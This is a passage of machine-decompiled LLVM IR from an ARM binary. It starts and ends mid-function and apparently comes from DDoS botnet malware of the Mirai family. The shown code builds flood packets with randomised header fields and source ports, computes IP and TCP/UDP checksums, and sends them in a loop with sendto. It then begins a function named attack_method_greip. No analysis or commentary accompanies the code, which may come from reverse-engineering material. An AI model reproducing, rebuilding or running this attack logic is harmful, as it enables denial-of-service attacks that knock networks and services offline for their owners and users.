  store i32 %v1_977c, i32* @r4, align 4
  store i32 %v4_9780, i32* %r3.global-to-local, align 4
  %v1_9784 = load i32, i32* @sl, align 4
  %v9_9784 = icmp eq i32 %v1_977c, %v1_9784
  store i1 %v9_9784, i1* %cpsr_z.global-to-local, align 1
  %v0_9788 = load i32, i32* @r7, align 4
  %v1_9788 = trunc i32 %v0_9788 to i16
  %v3_9788 = add i32 %v0_9774, 62
  %v4_9788 = inttoptr i32 %v3_9788 to i16*
  store i16 %v1_9788, i16* %v4_9788, align 2
  %v0_978c = load i32, i32* %r2.global-to-local, align 4
  %v1_978c = trunc i32 %v0_978c to i16
  %v2_978c = load i32, i32* @r6, align 4
  %v3_978c = inttoptr i32 %v2_978c to i16*
  store i16 %v1_978c, i16* %v3_978c, align 2
  %v0_9790 = load i32, i32* %r3.global-to-local, align 4
  %v1_9790 = trunc i32 %v0_9790 to i16
  %v2_9790 = load i32, i32* @r6, align 4
  %v3_9790 = add i32 %v2_9790, 2
  %v4_9790 = inttoptr i32 %v3_9790 to i16*
  store i16 %v1_9790, i16* %v4_9790, align 2
  %v0_9794 = load i32, i32* @r4, align 4
  store i32 %v0_9794, i32* %stack_var_-44, align 4
  %v5_9798 = icmp slt i32 %v1_977c, %v1_9784
  br i1 %v5_9798, label %dec_label_pc_9640, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %bb85
  %v1_97a4 = add i32 %v5_94c0, 8
  store i32 %v1_97a4, i32* %r4.global-to-local, align 4
  %v1_97a8 = add i32 %v5_94c0, 66
  store i32 %v1_97a8, i32* %r5.global-to-local, align 4
  %v0_97b8.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_97b4.preheader

dec_label_pc_97b4.preheader:                      ; preds = %dec_label_pc_979c, %dec_label_pc_9a4c
  %v0_97b8.pre = phi i32 [ %v0_97b8.pre.pre, %dec_label_pc_979c ], [ 0, %dec_label_pc_9a4c ]
  %stack_var_-132.0.ph = phi i32 [ %v1_97a8, %dec_label_pc_979c ], [ %v1_9a58, %dec_label_pc_9a4c ]
  %stack_var_-136.0.ph = phi i32 [ %v1_97a4, %dec_label_pc_979c ], [ %v1_9a54, %dec_label_pc_9a4c ]
  %v2_9a08 = icmp eq i32 %v1_956c, 0
  %v2_9850 = ptrtoint i32* %stack_var_-48 to i32
  %v2_9868 = ptrtoint i32* %stack_var_-52 to i32
  %v2_9878 = ptrtoint i32* %stack_var_-56 to i32
  %v2_9884 = ptrtoint i32* %stack_var_-54 to i32
  %v2_9898 = icmp eq i32 %v1_94e0, 0
  %v2_97f8 = icmp eq i32 %v5_9514, -1
  %v7_97f8 = icmp eq i32 %v5_9514, -1
  br label %dec_label_pc_97b4

dec_label_pc_97b4:                                ; preds = %dec_label_pc_97b4, %dec_label_pc_98a0, %dec_label_pc_97b4.preheader
  %v0_97b8 = phi i32 [ %v0_97b8.pre, %dec_label_pc_97b4.preheader ], [ 0, %dec_label_pc_97b4 ], [ %v1_993c, %dec_label_pc_98a0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_97b8 = icmp eq i32 %v0_97b8, 0
  store i1 %v2_97b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97b8, label %dec_label_pc_97b4, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_97c8

dec_label_pc_97c8:                                ; preds = %dec_label_pc_98a0, %dec_label_pc_97c4
  %v1_97dc = phi i32 [ %v1_9938, %dec_label_pc_98a0 ], [ 0, %dec_label_pc_97c4 ]
  %v5_97cc = mul i32 %v1_97dc, 24
  %v1_97d0 = load i32, i32* @sb, align 4
  %v2_97d0 = add i32 %v1_97d0, %v5_97cc
  store i32 %v2_97d0, i32* %r3.global-to-local, align 4
  store i32 %v2_93f4, i32* %r4.global-to-local, align 4
  %v1_97d8 = add i32 %v2_97d0, 20
  %v2_97d8 = inttoptr i32 %v1_97d8 to i8*
  %v3_97d8 = load i8, i8* %v2_97d8, align 1
  %v4_97d8 = zext i8 %v3_97d8 to i32
  store i32 %v4_97d8, i32* %r2.global-to-local, align 4
  %v4_97dc = mul i32 %v1_97dc, 4
  %v5_97dc = add i32 %v4_97dc, %v2_93f4
  %v6_97dc = inttoptr i32 %v5_97dc to i32*
  %v7_97dc = load i32, i32* %v6_97dc, align 4
  store i32 %v7_97dc, i32* @r5, align 4
  %v7_97e0 = icmp eq i8 %v3_97d8, 31
  store i1 %v7_97e0, i1* %cpsr_z.global-to-local, align 1
  %v1_97e4 = add i32 %v7_97dc, 24
  store i32 %v1_97e4, i32* @r7, align 4
  %v1_97e8 = add i32 %v7_97dc, 38
  store i32 %v1_97e8, i32* @r6, align 4
  %v1_97ec = add i32 %v7_97dc, 58
  store i32 %v1_97ec, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_97d8, 32
  br i1 %tmp90, label %dec_label_pc_994c, label %dec_label_pc_97f4

dec_label_pc_97f4:                                ; preds = %dec_label_pc_97c8
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_9808 = load i32, i32* @fp, align 4
  %v9_9808 = icmp eq i32 %v0_9808, 65535
  store i1 %v9_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9808, label %dec_label_pc_99c4, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_99ac.dec_label_pc_9810_crit_edge, %dec_label_pc_9800
  %v1_9814 = phi i32 [ %v1_9814.pre, %dec_label_pc_99ac.dec_label_pc_9810_crit_edge ], [ 65535, %dec_label_pc_9800 ]
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v9_9814 = icmp eq i32 %v3_9574, %v1_9814
  store i1 %v9_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9814, label %dec_label_pc_99ec, label %dec_label_pc_981c

dec_label_pc_981c:                                ; preds = %dec_label_pc_99c4.dec_label_pc_981c_crit_edge, %dec_label_pc_9810
  %v1_9820 = phi i32 [ %v1_9820.pre, %dec_label_pc_99c4.dec_label_pc_981c_crit_edge ], [ %v1_9814, %dec_label_pc_9810 ]
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v9_9820 = icmp eq i32 %v3_9578, %v1_9820
  store i1 %v9_9820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9820, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9828:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %dec_label_pc_9a1c, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_9828
  %v1_9830 = load i32, i32* @r5, align 4
  %v2_9830 = add i32 %v1_9830, 16
  %v3_9830 = inttoptr i32 %v2_9830 to i32*
  %v4_9830 = load i32, i32* %v3_9830, align 4
  store i32 %v4_9830, i32* %r3.global-to-local, align 4
  %v2_9834 = load i32, i32* @r6, align 4
  %v3_9834 = add i32 %v2_9834, 16
  %v4_9834 = inttoptr i32 %v3_9834 to i32*
  store i32 %v4_9830, i32* %v4_9834, align 4
  br label %dec_label_pc_983c

dec_label_pc_983c:                                ; preds = %bb88, %.thread11, %dec_label_pc_9a1c
  %v0_983c = call i32 @rand_next()
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  store i32 %v0_983c, i32* %stack_var_-48, align 4
  %v0_9844 = call i32 @rand_next()
  store i32 %v0_9844, i32* %r0.global-to-local, align 4
  store i32 %v0_9844, i32* %stack_var_-52, align 4
  %v0_984c = call i32 @rand_next()
  store i32 %v2_9850, i32* %r1.global-to-local, align 4
  store i32 %v0_984c, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_985c = load i32, i32* @r7, align 4
  store i32 %v0_985c, i32* %r0.global-to-local, align 4
  %v3_9860 = call i32 @util_memcpy(i32 %v0_985c, i32 %v2_9850, i32 4)
  %v0_9864 = load i32, i32* @r7, align 4
  %v1_9864 = add i32 %v0_9864, 6
  store i32 %v1_9864, i32* %r0.global-to-local, align 4
  store i32 %v2_9868, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_9870 = call i32 @util_memcpy(i32 %v1_9864, i32 %v2_9868, i32 4)
  %v0_9874 = load i32, i32* @r7, align 4
  %v1_9874 = add i32 %v0_9874, 4
  store i32 %v1_9874, i32* %r0.global-to-local, align 4
  store i32 %v2_9878, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9880 = call i32 @util_memcpy(i32 %v1_9874, i32 %v2_9878, i32 2)
  store i32 %v2_9884, i32* %r1.global-to-local, align 4
  %v0_9888 = load i32, i32* @r7, align 4
  %v1_9888 = add i32 %v0_9888, 10
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_9890 = call i32 @util_memcpy(i32 %v1_9888, i32 %v2_9884, i32 2)
  store i32 %v3_9890, i32* %r0.global-to-local, align 4
  store i32 %v1_94e0, i32* %r1.global-to-local, align 4
  store i1 %v2_9898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9898, label %dec_label_pc_98a0, label %dec_label_pc_9a28

dec_label_pc_98a0:                                ; preds = %dec_label_pc_983c, %dec_label_pc_9a28
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_98a4 = load i32, i32* @r5, align 4
  %v3_98a4 = add i32 %v2_98a4, 10
  %v4_98a4 = inttoptr i32 %v3_98a4 to i16*
  store i16 0, i16* %v4_98a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v2_98b0 = call i32 @checksum_generic(i32 %v0_98ac, i32 20)
  %v3_98b0 = trunc i32 %v2_98b0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_98b8 = load i32, i32* @r5, align 4
  %v4_98b8 = add i32 %v3_98b8, 10
  %v5_98b8 = inttoptr i32 %v4_98b8 to i16*
  store i16 %v3_98b0, i16* %v5_98b8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_98c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_98c0 = trunc i32 %v0_98c0 to i16
  %v2_98c0 = load i32, i32* @r6, align 4
  %v3_98c0 = add i32 %v2_98c0, 10
  %v4_98c0 = inttoptr i32 %v3_98c0 to i16*
  store i16 %v1_98c0, i16* %v4_98c0, align 2
  %v0_98c4 = load i32, i32* @r6, align 4
  store i32 %v0_98c4, i32* @r0, align 4
  %v2_98c8 = call i32 @checksum_generic(i32 %v0_98c4, i32 20)
  %v3_98c8 = trunc i32 %v2_98c8 to i16
  store i32 %v2_98c8, i32* %r0.global-to-local, align 4
  %v3_98cc = load i32, i32* @r6, align 4
  %v4_98cc = add i32 %v3_98cc, 10
  %v5_98cc = inttoptr i32 %v4_98cc to i16*
  store i16 %v3_98c8, i16* %v5_98cc, align 2
  store i32 0, i32* @r4, align 4
  %v0_98d4 = load i32, i32* @r8, align 4
  store i32 %v0_98d4, i32* @r1, align 4
  %v1_98d8 = add i32 %v0_98d4, 4
  %v2_98d8 = inttoptr i32 %v1_98d8 to i16*
  %v3_98d8 = load i16, i16* %v2_98d8, align 2
  %v4_98d8 = zext i16 %v3_98d8 to i32
  store i32 %v4_98d8, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_98e0 = add i32 %v0_98d4, 6
  %v4_98e0 = inttoptr i32 %v3_98e0 to i16*
  store i16 0, i16* %v4_98e0, align 2
  %v0_98e4 = load i32, i32* @r6, align 4
  store i32 %v0_98e4, i32* %r0.global-to-local, align 4
  %v4_98e8 = call i32 @checksum_tcpudp(i32 %v0_98e4, i32 %v0_98d4, i32 %v4_98d8, i32 %stack_var_-136.0.ph)
  %v5_98e8 = trunc i32 %v4_98e8 to i16
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  %v3_98ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98ec, i32* %r2.global-to-local, align 4
  %v3_98f0 = mul i32 %v3_98ec, 32
  store i32 %v3_98f0, i32* %r3.global-to-local, align 4
  %v0_98f4 = load i32, i32* @r5, align 4
  %v1_98f4 = add i32 %v0_98f4, 16
  %v2_98f4 = inttoptr i32 %v1_98f4 to i32*
  %v3_98f4 = load i32, i32* %v2_98f4, align 4
  %v5_98f8 = mul i32 %v3_98ec, 24
  store i32 %v5_98f8, i32* %r3.global-to-local, align 4
  %v1_98fc = load i32, i32* @sb, align 4
  %v2_98fc = add i32 %v1_98fc, %v5_98f8
  store i32 %v2_98fc, i32* @lr, align 4
  %v2_9900 = add i32 %v2_98fc, 4
  %v3_9900 = inttoptr i32 %v2_9900 to i32*
  store i32 %v3_98f4, i32* %v3_9900, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_9908 = load i32, i32* @r8, align 4
  %v4_9908 = add i32 %v3_9908, 6
  %v5_9908 = inttoptr i32 %v4_9908 to i16*
  store i16 %v5_98e8, i16* %v5_9908, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9910 = load i32, i32* %r1.global-to-local, align 4
  %v1_9910 = trunc i32 %v0_9910 to i16
  %v2_9910 = load i32, i32* %r3.global-to-local, align 4
  %v3_9910 = load i32, i32* @sb, align 4
  %v4_9910 = add i32 %v3_9910, %v2_9910
  %v5_9910 = inttoptr i32 %v4_9910 to i16*
  store i16 %v1_9910, i16* %v5_9910, align 2
  %v0_9914 = load i32, i32* @r4, align 4
  %v1_9914 = trunc i32 %v0_9914 to i16
  %v2_9914 = load i32, i32* @lr, align 4
  %v3_9914 = add i32 %v2_9914, 2
  %v4_9914 = inttoptr i32 %v3_9914 to i16*
  store i16 %v1_9914, i16* %v4_9914, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_991c = load i32, i32* @r5, align 4
  store i32 %v0_991c, i32* %r1.global-to-local, align 4
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_9928 = load i32, i32* @lr, align 4
  %v0_992c = load i32, i32* %ip.global-to-local, align 4
  %v6_9930 = call i32 @__libc_sendto(i32 %v3_9528, i32 %v0_991c, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_9928, i32 %v0_992c)
  %v3_9934 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9934, i32* %r3.global-to-local, align 4
  %v1_9938 = add i32 %v3_9934, 1
  store i32 %v1_9938, i32* %r0.global-to-local, align 4
  %v1_993c = load i32, i32* @sl, align 4
  %v9_993c = icmp eq i32 %v1_9938, %v1_993c
  store i1 %v9_993c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9938, i32* %stack_var_-44, align 4
  %v6_9944 = icmp slt i32 %v1_9938, %v1_993c
  br i1 %v6_9944, label %dec_label_pc_97c8, label %dec_label_pc_97b4

dec_label_pc_994c:                                ; preds = %dec_label_pc_97c8
  %v1_994c = add i32 %v2_97d0, 16
  %v2_994c = inttoptr i32 %v1_994c to i32*
  %v3_994c = load i32, i32* %v2_994c, align 4
  store i32 %v3_994c, i32* %r4.global-to-local, align 4
  %v0_9950 = call i32 @rand_next()
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v3_9954 = load i32, i32* %stack_var_-44, align 4
  %v5_995c = mul i32 %v3_9954, 24
  %v0_9960 = load i32, i32* %r4.global-to-local, align 4
  %v1_9960 = and i32 %v0_9960, 16711680
  store i32 %v1_9960, i32* %ip.global-to-local, align 4
  %v3_9964 = udiv i32 %v0_9960, 16777216
  %v4_9968 = udiv i32 %v1_9960, 256
  %v5_9968 = or i32 %v4_9968, %v3_9964
  store i32 %v5_9968, i32* %r2.global-to-local, align 4
  %v1_996c = load i32, i32* @sb, align 4
  %v2_996c = add i32 %v1_996c, %v5_995c
  store i32 %v2_996c, i32* %r1.global-to-local, align 4
  %v1_9970 = and i32 %v0_9960, 65280
  store i32 %v1_9970, i32* %r3.global-to-local, align 4
  %v1_9974 = add i32 %v2_996c, 20
  %v2_9974 = inttoptr i32 %v1_9974 to i8*
  %v3_9974 = load i8, i8* %v2_9974, align 1
  %v4_9974 = zext i8 %v3_9974 to i32
  store i32 %v4_9974, i32* %ip.global-to-local, align 4
  %v5_997c = call i32 @llvm.bswap.i32(i32 %v0_9960)
  %v7_9980 = lshr i32 %v0_9950, %v4_9974
  %v8_9980 = add i32 %v7_9980, %v5_997c
  store i32 %v8_9980, i32* %r2.global-to-local, align 4
  %v1_9984 = and i32 %v8_9980, 16711680
  store i32 %v1_9984, i32* %r0.global-to-local, align 4
  store i32 %v5_9514, i32* %r1.global-to-local, align 4
  %v5_999c = call i32 @llvm.bswap.i32(i32 %v8_9980)
  store i32 %v5_999c, i32* %r3.global-to-local, align 4
  store i1 %v7_97f8, i1* %cpsr_z.global-to-local, align 1
  %v1_99a4 = load i32, i32* @r5, align 4
  %v2_99a4 = add i32 %v1_99a4, 16
  %v3_99a4 = inttoptr i32 %v2_99a4 to i32*
  store i32 %v5_999c, i32* %v3_99a4, align 4
  br i1 %v2_97f8, label %dec_label_pc_99ac, label %dec_label_pc_9800

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97f4
  %v0_99ac = call i32 @rand_next()
  store i32 %v0_99ac, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_99b8 = load i32, i32* @fp, align 4
  %v9_99b8 = icmp eq i32 %v0_99b8, 65535
  store i1 %v9_99b8, i1* %cpsr_z.global-to-local, align 1
  %v1_99bc = load i32, i32* @r5, align 4
  %v2_99bc = add i32 %v1_99bc, 12
  %v3_99bc = inttoptr i32 %v2_99bc to i32*
  store i32 %v0_99ac, i32* %v3_99bc, align 4
  br i1 %v9_99b8, label %dec_label_pc_99c4, label %dec_label_pc_99ac.dec_label_pc_9810_crit_edge

dec_label_pc_99ac.dec_label_pc_9810_crit_edge:    ; preds = %dec_label_pc_99ac
  %v1_9814.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9810

dec_label_pc_99c4:                                ; preds = %dec_label_pc_99ac, %dec_label_pc_9800
  %v0_99c4 = call i32 @rand_next()
  %v3_99cc = urem i32 %v0_99c4, 65536
  store i32 %v3_99cc, i32* %r0.global-to-local, align 4
  store i32 %v3_9574, i32* %r2.global-to-local, align 4
  %v1_99d8 = sub nsw i32 999, %v3_99cc
  store i32 %v1_99d8, i32* %r3.global-to-local, align 4
  %v1_99dc = load i32, i32* %r4.global-to-local, align 4
  %v9_99dc = icmp eq i32 %v3_9574, %v1_99dc
  store i1 %v9_99dc, i1* %cpsr_z.global-to-local, align 1
  %v1_99e0 = trunc i32 %v0_99c4 to i16
  %v2_99e0 = load i32, i32* @r5, align 4
  %v3_99e0 = add i32 %v2_99e0, 4
  %v4_99e0 = inttoptr i32 %v3_99e0 to i16*
  store i16 %v1_99e0, i16* %v4_99e0, align 2
  %v0_99e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_99e4 = trunc i32 %v0_99e4 to i16
  %v2_99e4 = load i32, i32* @r6, align 4
  %v3_99e4 = add i32 %v2_99e4, 4
  %v4_99e4 = inttoptr i32 %v3_99e4 to i16*
  store i16 %v1_99e4, i16* %v4_99e4, align 2
  br i1 %v9_99dc, label %dec_label_pc_99ec, label %dec_label_pc_99c4.dec_label_pc_981c_crit_edge

dec_label_pc_99c4.dec_label_pc_981c_crit_edge:    ; preds = %dec_label_pc_99c4
  %v1_9820.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_981c

dec_label_pc_99ec:                                ; preds = %dec_label_pc_99c4, %dec_label_pc_9810
  %v0_99ec = call i32 @rand_next()
  %v1_99ec = trunc i32 %v0_99ec to i16
  store i32 %v0_99ec, i32* %r0.global-to-local, align 4
  store i32 %v3_9578, i32* %r3.global-to-local, align 4
  %v1_99f4 = load i32, i32* %r4.global-to-local, align 4
  %v9_99f4 = icmp eq i32 %v3_9578, %v1_99f4
  store i1 %v9_99f4, i1* %cpsr_z.global-to-local, align 1
  %v3_99f8 = load i32, i32* @r5, align 4
  %v4_99f8 = add i32 %v3_99f8, 58
  %v5_99f8 = inttoptr i32 %v4_99f8 to i16*
  store i16 %v1_99ec, i16* %v5_99f8, align 2
  br i1 %v9_99f4, label %dec_label_pc_9a00, label %dec_label_pc_9828

dec_label_pc_9a00:                                ; preds = %dec_label_pc_99ec, %dec_label_pc_981c
  %v0_9a00 = call i32 @rand_next()
  %v1_9a00 = trunc i32 %v0_9a00 to i16
  store i32 %v0_9a00, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* @r4, align 4
  store i1 %v2_9a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a08, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_9a00
  %v3_9a1032 = load i32, i32* @r8, align 4
  %v4_9a1033 = add i32 %v3_9a1032, 2
  %v5_9a1034 = inttoptr i32 %v4_9a1033 to i16*
  store i16 %v1_9a00, i16* %v5_9a1034, align 2
  br label %dec_label_pc_9a1c

bb88:                                             ; preds = %dec_label_pc_9a00
  %v1_9a0c = load i32, i32* @r5, align 4
  %v2_9a0c = add i32 %v1_9a0c, 16
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  %v4_9a0c = load i32, i32* %v3_9a0c, align 4
  store i32 %v4_9a0c, i32* %r3.global-to-local, align 4
  %v3_9a10 = load i32, i32* @r8, align 4
  %v4_9a10 = add i32 %v3_9a10, 2
  %v5_9a10 = inttoptr i32 %v4_9a10 to i16*
  store i16 %v1_9a00, i16* %v5_9a10, align 2
  %v1_9a14 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a14 = load i32, i32* @r6, align 4
  %v3_9a14 = add i32 %v2_9a14, 16
  %v4_9a14 = inttoptr i32 %v3_9a14 to i32*
  store i32 %v1_9a14, i32* %v4_9a14, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a1c:                                ; preds = %.thread31, %dec_label_pc_9828
  %v0_9a1c = call i32 @rand_next()
  store i32 %v0_9a1c, i32* %r0.global-to-local, align 4
  %v1_9a20 = load i32, i32* @r6, align 4
  %v2_9a20 = add i32 %v1_9a20, 16
  %v3_9a20 = inttoptr i32 %v2_9a20 to i32*
  store i32 %v0_9a1c, i32* %v3_9a20, align 4
  br label %dec_label_pc_983c

dec_label_pc_9a28:                                ; preds = %dec_label_pc_983c
  %v0_9a28 = load i32, i32* @r8, align 4
  %v1_9a28 = add i32 %v0_9a28, 8
  store i32 %v1_9a28, i32* %r0.global-to-local, align 4
  store i32 %v5_94c0, i32* %r1.global-to-local, align 4
  %v2_9a30 = inttoptr i32 %v1_9a28 to i16*
  %v3_9a30 = call i32 @rand_str(i16* %v2_9a30, i32 %v5_94c0)
  store i32 %v3_9a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_98a0

dec_label_pc_9a38:                                ; preds = %dec_label_pc_9538
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v1_9a3c = call i32 @__GI___libc_close(i32 %v3_9528)
  store i32 %v1_9a3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a40

dec_label_pc_9a40:                                ; preds = %entry, %dec_label_pc_9a38
  %v1_9a48 = phi i32 [ %v3_9528, %entry ], [ %v1_9a3c, %dec_label_pc_9a38 ]
  store i32 %v3_93d8, i32* %r4.global-to-local, align 4
  store i32 %v6_93d8, i32* %r5.global-to-local, align 4
  store i32 %v24_93d8, i32* %fp.global-to-local, align 4
  ret i32 %v1_9a48

dec_label_pc_9a4c:                                ; preds = %dec_label_pc_9560
  %v1_9a54 = add i32 %v5_94c0, 8
  store i32 %v1_9a54, i32* %r1.global-to-local, align 4
  %v1_9a58 = add i32 %v5_94c0, 66
  store i32 %v1_9a58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_97b4.preheader

; uselistorder directives
  uselistorder i32 %v1_9a58, { 1, 0 }
  uselistorder i32 %v1_9a54, { 1, 0 }
  uselistorder i16 %v1_9a00, { 1, 0 }
  uselistorder i32 %v0_9a00, { 1, 0 }
  uselistorder i32 %v0_99ec, { 1, 0 }
  uselistorder i32 %v3_99cc, { 1, 0 }
  uselistorder i32 %v0_99c4, { 1, 0 }
  uselistorder i32 %v5_999c, { 1, 0 }
  uselistorder i32 %v0_9960, { 1, 2, 0, 3 }
  uselistorder i32 %v1_993c, { 1, 2, 0 }
  uselistorder i32 %v1_9938, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_98ec, { 1, 0, 2 }
  uselistorder i32 %v4_98e8, { 1, 0 }
  uselistorder i32 %v0_98d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_98c8, { 1, 0 }
  uselistorder i32 %v7_97dc, { 2, 1, 0, 3 }
  uselistorder i1 %v7_97f8, { 2, 1, 0 }
  uselistorder i1 %v2_9a08, { 2, 3, 1, 0 }
  uselistorder i32 %v0_974c, { 1, 0, 2 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v3_95ac, { 1, 2, 0 }
  uselistorder i32 %v1_95a8, { 1, 0 }
  uselistorder i32 %v1_956c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_9568, { 1, 0, 3, 2 }
  uselistorder i32 %v0_9564, { 1, 0, 2, 3 }
  uselistorder i32 %v0_9560, { 1, 0, 2, 3 }
  uselistorder i1 %v7_9558, { 1, 0 }
  uselistorder i1 %v7_952c, { 1, 0 }
  uselistorder i32 %v3_9528, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_9514, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_94e0, { 1, 2, 0 }
  uselistorder i32 %v5_94c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_9474, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 1, 0 }
  uselistorder i32 %v5_9448, { 1, 0 }
  uselistorder i8 %v5_942c, { 0, 2, 1 }
  uselistorder i32 %v6_940c, { 1, 0 }
  uselistorder i32 %v2_93f4, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 1, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 12, 11, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 11, 37, 12, 13, 15, 14, 16, 17, 19, 18, 21, 20, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 17, 27, 28, 29, 30, 31, 33, 32, 36, 34, 35, 39, 37, 38, 40, 42, 41, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 8, 9, 10, 11, 12, 13, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9a40, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
  uselistorder label %dec_label_pc_983c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_97b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_97b4.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_method_greip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9a6c = load i32, i32* @r4, align 4
  %v6_9a6c = load i32, i32* @r5, align 4
  %v24_9a6c = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
